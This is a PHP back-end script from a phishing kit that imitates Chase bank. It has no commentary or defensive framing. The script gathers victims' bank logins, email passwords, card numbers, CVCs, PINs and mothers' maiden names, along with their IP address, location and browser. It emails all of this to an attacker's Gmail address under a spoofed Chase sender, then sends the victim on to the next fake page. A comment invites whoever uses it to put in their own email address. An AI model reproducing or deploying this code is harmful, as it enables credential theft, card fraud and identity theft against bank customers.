<?
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Chase Info-----------------------\n";
$message .= "User ID            : ".$_POST['usr']."\n";
$message .= "Password          : ".$_POST['psw']."\n";
$message .= "--------------Page 2-----------------------\n";
$message .= "User ID            : ".$_POST['usr1']."\n";
$message .= "Password          : ".$_POST['psw1']."\n";
$message .= "--------------Page 3-----------------------\n";
$message .= "Email Address          : ".$_POST['eml']."\n";
$message .= "Email Password          : ".$_POST['eps']."\n";
$message .= "--------------Page 4-----------------------\n";
$message .= "Email Address          : ".$_POST['eml1']."\n";
$message .= "Email Password          : ".$_POST['eps1']."\n";
$message .= "--------------Page 5-----------------------\n";
$message .= "Name on Card          : ".$_POST['noc']."\n";
$message .= "Card Number          : ".$_POST['cn']."\n";
$message .= "Expiry Date          : ".$_POST['ex']."\n";
$message .= "CVC          : ".$_POST['cv']."\n";
$message .= "Card PIN          : ".$_POST['pn']."\n";
$message .= "MMN          : ".$_POST['mn']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY Burhan-------------\n";
//change ur email here
$send = "fudpages@gmail.com";
$subject = "Result from $ip";
$headers = "From: Chase<supertool@mxtoolbox.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);

 }
    header("Location: step6.php");
  

?>